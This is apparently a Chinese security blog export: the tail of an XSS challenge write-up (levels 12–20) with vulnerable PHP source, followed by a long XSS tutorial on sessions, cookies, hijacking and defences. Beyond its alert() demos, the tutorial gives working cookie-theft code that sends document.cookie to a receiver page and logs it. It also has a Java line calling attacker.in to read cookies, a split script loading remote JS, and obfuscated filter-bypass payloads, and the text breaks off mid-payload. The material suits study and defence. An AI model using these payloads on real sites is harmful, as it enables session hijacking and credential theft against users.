10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot; type=&quot;hidden&quot;&gt; 用BurpSuite抓包修改UserAgent Forward 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ua&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; 查看代码 $str11获取User Agent，过滤掉&lt;&gt;再输出到t_ua Level 13Firebug审查元素 看到t_cook 使用BurpSuite抓包 Forward 可以看到t_cook的值是Cookie中user的值 抓包修改Cookie Forward 1234567891011121314151617&lt;?php setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_COOKIE[&quot;user&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_cook&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&apos;;?&gt; $str11获取Cookie中的user，过滤掉&lt;&gt;再输出到t_cook Level 14使用Firebug审查元素 发现iframe标签，连接到http://www.exifviewer.org 以为要通过注入修改iframe标签，但查了一下是要上传xss图片到这个网页上，解析之后弹窗 开了纸飞机之后，页面加载成功 恶意图片 上传图片页面 Upload 1234567891011&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;title&gt;欢迎来到level14&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 查看代码没有任何输入点，只能访问http://www.exifviewer.org 原理是修改图片的exif信息，在解析器解析图片exif时触发XSS。 未加载的图片都是XSSpayload Level 15测试显示效果 好像没有输出… 页面加载了一个JavaScript脚本 在页面源代码里看到输出点 查了一下ng-include:，发现可以包含一个页面 包含一下第一关的Payload 12345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;?&gt; 好像Firebug对未加载的标签并不显示，因为没有1.gif这个文件，所以只能在源代码里查看 ng-include包含的文件需要用引号括起来 Level 16测试显示效果 1&quot;;!–&apos;&lt;CheSSurOnonSrcsrcscriptScRIPt&gt;=&amp;&#123;()&#125; script被过滤为空格，空格被转义为&amp;nbsp;，大小写被过滤，src和on未被过滤，用&lt;img&gt;标签测试 发现/也被过滤成空格 使用%0a、%0c、%0d绕过空格检测 12345678910111213&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;?&gt; 查看代码，script、、/都被过滤为&amp;nbsp; Level 17测试显示效果 闭合src 1234&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt; 查看代码，发现2个变量都被HTML实体化编码转义，使用on事件可以绕过 Level 18测试显示效果 闭合src 1234&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt; 查看代码，发现和Level 17的代码区别在于引用了不同的文件，在过滤上并没有改动，所以Level 17的Payload依然可以用 这两关看起来像Flash XSS，但其实只是简单的注入 Level 19这关真的是考察Flash XSS，并不懂怎么反编译flash，而且现在flash用的也少了，学习的价值并不高，忘记在哪里看到一句话 两年内用不到的知识，并不需要去学习。两年后会被淘汰的知识，也不需要去学习。 这里只放上Payload From:XSS挑战之旅–游戏闯关 1?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt; Level 20同Level 19 只放上Payload From:XSS挑战之旅–游戏闯关 1?arg01=id&amp;arg02=\\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//%26width%26height 总结1.使用on事件绕过&lt;&gt;的转义 Level 22.使用javascript:alert()绕过对on事件的过滤 Level 53.测试不应该跳过任何一步，XSS挑战的难度设计并不是线性增加的，有时上一关无效的payload，可能下一关就有用了 Level 64.输出点在&lt;a&gt;标签中，可以使用&lt;a href=javascript:alert()&lt;/a&gt;绕过 Level 85.使用&amp;#x0A;等制表符来绕过过滤 Level 86.判断输入是否合法，可以根据函数特性绕过，如strpos()函数 Level 97.查看源码是个好习惯，希望我有 Level 108.修改referer、user agent、cookie注入xsspayload Level 11，Level 12，Level 139.有时Firebug不会显示某些元素，还是要多看源码 Level 1510.ng-include包含的文件需要用引号括起来 Level 1511.使用%0a、%0c、%0d绕过空格检测 Level 1612.看起来像A，但要试过才知道是不是 Level 17 Level 18 感受XSS Challenge并不像Sqli-Lab难度是递增的，有的关卡使用相同Payload都可以过去，不过还是学到了很多新的姿势。感谢作者做了这个挑战，也感谢各个写了WriteUp的大佬，学到很多新的姿势。 参考[1] 某xss挑战赛闯关笔记 [2] XSS挑战之旅–游戏闯关","categories":[],"tags":[]},{"title":"'XSS'","slug":"XSS","date":"2019-05-10T12:36:22.000Z","updated":"2019-07-05T13:23:44.399Z","comments":true,"path":"2019/05/10/XSS/","link":"","permalink":"https://chirec.github.io/2019/05/10/XSS/","excerpt":"XSS(Cross-Site script)跨站脚本攻击。XSS最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。是一种经常出现再web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。","text":"XSS(Cross-Site script)跨站脚本攻击。XSS最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。是一种经常出现再web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段。 1. 基础知识1.1 Session服务器使用Session将用户身份信息临时保存在服务器上，用户离开网站后Session会被销毁。客户端使用Cookie保存SessionID。这种对用户身份信息存储的方式相对于Cookie来说，比较安全。 1.2 CookieCookie分为内存Cookie(临时型Cookie)和硬盘Cookie，内存Cookie储存在浏览器内存中，关闭浏览器则消失；硬盘Cookie以文本形式存储在硬盘上，由浏览器存取。Cookie由变量名与值组成，其属性里有标准的Cookie变量，也有用户自定义的属性。cookie格式：Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]cookie各个参数详细内容： Set-Cookie:http响应头，向客户端发送Cookie。 Name=value:每个Cookie必须包含的内容。 Expires=date:EXpires确定了Cookie的有效终止日期，可选。如果缺省，则Cookie不保存在硬盘中，只保存在浏览器内存中。 Domain=domain-name:确定了哪些inernet域中的web服务器可读取浏览器储存的Cookie，缺省为该web服务器域名。 Path=path:定义了web服务器哪些路径下的页面可获取服务器发送的Cookie。 Secure:在Cookie中标记该变量，表明只有为https通信协议时，浏览器才向服务器提交cookie。 Httponly:禁止javascript读取,如果Cookie中的一个参数带有httponly，则这个参数将不能被javascript获取；httponly可以防止xss会话劫持攻击。 1.3 会话劫持1.3.1 普通攻击步骤1.目标用户登录站点2.登录成功后，该用户会得到站点提供的一个会话标识SessionID3.攻击者通过某种攻击手段捕获Session ID4.攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话 1.3.2 获取SessionID的方式有多种1.暴力破解：尝试各种Session ID，直到破解为止2.预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来3.窃取：使用网络嗅探(cain、ettercap)，XSS攻击等方法获得 1.4 会话固定会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（SessionID）的攻击手段。这是攻击者获取合法会话标识的最简单的方法。会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。 1.4.1 攻击步骤1.攻击者通过某种手段重置目标用户的SessionID，然后监听用户会话状态；2.目标用户携带攻击者设定的Session ID登录站点；3.攻击者通过Session ID获得合法会话 1.5 攻击者重置SessionID的方式重置Session ID的方法同样也有多种，可以是跨站脚本攻击，如果是URL传递Session ID，还可以通过诱导的方式重置该参数，比如可以通过邮件的方式诱导用户去点击重置Session ID的URL，使用Cookie传递可以避免这种攻击.使用Cookie来存放Session ID，攻击者可以在以下三种可用的方法中选择一种来重置Session ID。 1.使用客户端脚本来设置Cookie到浏览器。大多数浏览器都支持用客户端脚本来设置Cookie的，例如document.cookie=”sessionid=123”，这种方式可以采用跨站脚本攻击来达到目的。防御方式可以是设置HttpOnly属性，但有少数低版本浏览器存在漏洞，即使设置了HttpOnly，也可以重写Cookie。所以还需要加其他方式的校验，如User-Agent验证，Token校验等同样有效。2.使用HTML的\\标签加Set-Cookie属性。服务器可以靠在返回的HTML文档中增加\\标签来设置Cookie。例如，与客户端脚本相比，对\\标签的处理目前还不能被浏览器禁止。3.使用Set-Cookie的HTTP响应头部设置Cookie。攻击者可以使用一些方法在Web服务器的响应中加入Set-Cookie的HTTP响应头部。 1.6 会话劫持防御方法1.用户登录时生成新的Session ID。如果攻击者使用的会话标识符不是有效的，那么这种方式将会非常有效。如果不是有效的会话标识符，服务器将会要求用户重新登录。如果攻击者使用的是有效的Session ID，那么还可以通过校验的方式来避免攻击。2.大部分防止会话劫持的方法对会话固定攻击同样有效。如设置HttpOnly，关闭透明化Session ID，User-Agent验证，Token校验等。3.更改session的名称：session的默认名称是PHPSESSID,此变量会保存在cookie中，如果黑客不抓包分析，就不能猜到这个名称，阻挡部分攻击。 1.7 JavaScript 事件 事件 描述 onabort 图像加载被中断 onblur 元素失去焦点 onchange 用户改变域的内容 onclick 鼠标单击HTML元素 ondblclick 鼠标双击HTML对象 onerror d当加载文档或图像时发生某个错误 onmouseover 用户再一个HTML元素上移动鼠标 onmouseout 用户从一个HTML元素上移开鼠标 onkeydown 某个键盘的键被按下 onkeypress 某个键盘的键被按下或按住 onkeyup 某个键盘的键被松开 onload 浏览器已完成页面的加载 onmousedown 某个鼠标按键被按下 onmousemove 鼠标被移动 onmouseup 某个鼠标按键被松开 onreset 重置按钮被点击 onresize 窗口或框架被调整尺寸 onselect 文本被选定 onsubmit 提交按钮被点击 onunload 用户退出页面 2. XSS分类2.1 反射型XSS反射型跨站脚本也称作非持久型、参数型跨站脚本。这类型的脚本是最常见的，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中。一般使用的将构造好的URL发给受害者，受害者点击触发，而且只执行一次，非持久化。 2.2 存储型XSS存储型XSS比反射型跨站脚本更具威胁性，并且可能影响到web服务器的自身安全。此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先将恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。 2.3 DOM型XSS简单去理解就是因为他输出点在DOM，将用户提交的参数(恶意代码)拿过来拼接HTML代码，利用可编辑的文档对象去自动生成HTML代码，让浏览器解析，达到攻击的目的 利用思想：1.在标签内部构造出恶意代码2.标签闭合 让恶意代码逃逸出来 注意：无论反射型还是存储型，都是需要与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码，因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。 From：浅谈跨站脚本攻击与防御 3. 漏洞挖掘3.1 FireFox中常用XSS调试插件Hackbar、Firebug、Tamper Data、Live HTTP Headers、Editor Cookie 3.2 手工挖掘闭合标签 1234567&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;img/src=@onerror=alert(1)/&gt;&quot;&gt;&lt;img/src=@onerror=alert(1)/&gt;&apos;onmouseover=alert(1) x=&apos;javascript:alert(1)//&quot;;alert(1)// 3.2.1 数据交互的地方登录、留言板、评论、搜索测试用户输入的地方、文件上传的地方、flash 3.3 工具挖掘awvs、netsparke、appscan、burp、xsser、xsscrapy、brutexssr、OWASP Xenotix 4. XSS的危害1.网络钓鱼，包括盗取各类的用户账号2.窃取用户cookie3.窃取用户浏览会话4.强制弹出广告页面、刷流量5.网页挂马6.提升用户权限，进一步渗透网站7.传播跨站脚本蠕虫 5. 防御XSS5.1 转义htmlspecialchars()函数把一些预定义的字符转换为HTML实体。预定义字符： 12345&amp; （和号）成为 &amp;amp;&quot; （双引号）成为 &amp;quot;&apos; （单引号）成为 &amp;#39&lt; （小于）成为 &amp;lt;&gt; （大于）成为 &amp;gt; 5.2 HTTPOnlyHTTPOnly是指仅在HTTP层面上传输Cookie，当设置HTTPOnly标志后，客户端脚本就无法读写该Cookie。 在php.ini中设置 1session.cookie_httponly = Cookie操作函数setcookie函数和setrawcookie函数也专门添加了第7个参数来做为HttpOnly的选项，开启方法为： 1234&lt;?php setcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); setrawcookie(&quot;abc&quot;, &quot;test&quot;, NULL, NULL, NULL, NULL, TRUE); ?&gt; HTTPOnly绕过 1.PHPinfo信息 phpinfo页面可以包含Cookie信息，同样存在HTTPOnly Cookie 2.支持TRACE方法的服务器 Apache支持的一个Header是TRACE，TRACE一般是用于调试，他会将请求头作为HTTP Response Body返回。利用这个特性，可以把HttpOnly Cookie读出来。不过目前各厂商已经禁止通过Ajax发送TRACE请求。 3.Django等一些web框架的调试页面 开启了调试模式的一些框架，会将程序的信息输出，其中就有Cookie信息。 4.CVE-3009-0357 Firefox &lt;= 1.9.1在处理HttpOnly Cookies时存在bug，通过getResponseHeader()得不到HttpOnly Cookie，但是通过getAllResponseHeaders()可以得到。 5.Java getHeaderField 1alert(new java.net.URL(&apos;http://attacker.in/xss/cookie.php&apos;).openConnection().getHeaderField(&apos;set-cookie&apos;)); 5.3 输入过滤（1）验证输入 比如一个输入框，需要我们输入电话号码，电话号码必须是数字格式，有一定的长度，可以使用正则匹配 reg = /^020-\\d{8}$/ 常见的检测和过滤： 输入是否仅仅包含合法的字符 输入字符串是否超过最大限度 输入如果为数字，数字是否在指定的范围内 pentest@163.com—&gt;规则 输入是否符合特殊格式要求，如E-mail地址、IP地址等 （2）采用黑名单过滤敏感字符 1&lt; &gt; &apos; &quot; &amp; # javascript expression a img script 注意，对用户输入的数据，不能仅仅在客户端使用JS进行验证，需要在服务器端进行验证检测。 5.4 输出过滤对html字符，比如&lt;&gt;&amp;”等进行编码和转义 很多程序语言退出相应的程序库，可以协助程序开发者针对html输出，如ASP的Server.HTMLEncode()函数、ASP.NET的Server.HtmlEncode()函数、PHP的htmlspecialchars()函数 5.5 限制标签使用控制用户可以使用的标签，只能使用一些安全的标签，如\\、\\等。 5.6 防XSS代码12$x=preg_replace(&quot;/script/i&quot;,&quot;&quot;,$x);$x=preg_replace(&quot;/alert/i&quot;,&quot;&quot;,$x); 5.7 内容安全策略Content Security Policy, CSP内容安全策略是防御XSS攻击的一种安全机制，其思想是以服务器白名单的形式来配置可信的内容来源，客户端Web应用代码可以使用这些安全来源。Cisco研究人员找到了绕过CSP的一种方法，攻击者可以利用这种方法，注入被禁止的代码，从而窃取隐私数据。 6. 综合利用6.1 Cookie获取6.1.1 反射型XSS的Cookie获取将XSS发送给登录用户，使其点击将URL写在图片中，更加隐蔽 1&lt;img src=&quot;URL&quot;&gt; 6.1.2 存储型XSS的Cookie获取留言板 闭合文本域 6.1.3 HTTP-Only启用时获取CookieJavaScript代码接受PHP 6.1.4 编写接收Cookie代码123456789101112&lt;script&gt; var cookie=document.cookie; var url=&quot;http://127.0.0.1/cookie.php?x=&quot;; windows.location.href=url+cookie;&lt;/script&gt;&lt;?php $cookie=$_GET[&apos;x&apos;] $file=fopen(&quot;cookie.txt&quot;,&quot;w+&quot;); fwrite($file,$cookie); fclose($file);?&gt; 6.2 上传型xss1&lt;script&gt;alert(/xss/)&lt;/script&gt;.jpg 访问图片时会触发，需要闭合标签 6.3 通过XSS留后门在管理页面中插入xss获取cookie，每次管理员登录都可以获取cookie需要获得webshell 7. Payload1234567891&apos; onclick=alert(1) //1&apos;&gt;&lt; img src=# onerror=alert(1)&gt;//&apos;&gt;&lt;svg &lt;/onload =&quot;1&gt; (_=prompt,_(1)) &quot;&quot;&gt;&lt;a&apos;&apos;&gt;&lt;details open ontoggle=confirm()&gt;&lt;a&apos;&quot;&apos;/&gt; &lt;svg/onload=alert(1)///&gt;&lt; img src=# onerror=alert(1)/&gt;//&quot;&quot;&apos; onmouseover=&quot;alert(1)&quot;&apos;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;&lt; a href=&apos; &apos; onclick=alert(1) // &apos;&gt;testLink&lt;/ a&gt; 8. XSS Payload绕过8.1 大小写1&lt;ScRiPt&gt;alert(/xss/)&lt;/ScRiPt&gt; 8.2 重复写1&lt;scr&lt;script&gt;ipt&gt; 8.3 使用javascript伪协议1&lt;img src=&quot;javascritp:alert(/xss/);&quot;&gt; 8.4 使用空格、回车、tab123&lt;img src=&quot;javasCript:Alert(/xss/)&quot;&gt; 8.5 双引号改单引号1&lt;img src=&apos;javascript:alert(/xss/);&apos;&gt; 8.6 利用JavaScript事件1&lt;img src=x onmouseover=&quot;alert(/xss)&quot;&gt; 8.7 拆分12345678910&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos; src=ht&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;tp://ww&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;w.shell&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;.net/1.&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;&lt;script&gt;z=z+&apos;ript&gt;&quot;)&apos;&lt;/script&gt;&lt;script&gt;eval_r(z)&lt;/script&gt; 8.8 css中构造XSS Payload123&lt;div style=&quot;list-style-image:url(javascript:alert(&apos;/xss/&apos;))&quot;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;http://www.xss.com/attack.css&quot;&gt;//在http://www.xss.com/attack.css中插入恶意代码 8.9 字符编码8.9.1 URL编码1%3Cimg%20src%3Dx%20onerror%3Dalert(/xss/)%3e 8.9.2 HTML实体编码12345&lt; &gt;//十进制&amp;#60; &amp;#62;//Hex&amp;#x3c; &amp;#x3e; 8.9.3 Hex配合eval()使用 1&lt;img src=x onerror=eval(&quot;\\x61\\x6C\\x65\\x72\\x74\\x28\\x2F\\x78\\x73\\x73\\x2F\\x29&quot;)&gt; 8.9.4 十进制Ascii码配合String.fromCharCode())使用 1&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&lt;/script&gt; 8.9.5 八进制1&lt;img src=x onerror=eval(&quot;\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51&quot;)&gt; 8.9.6 Unicode1&lt;img src=x onerror=eval(&quot;\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u002F\\u0078\\u0073\\u0073\\u002F\\u0029&quot;)&gt; 8.9.7 jsfuckalert(/xss/) 1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 8.9.8 aaencodealert(/xss/) 1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) 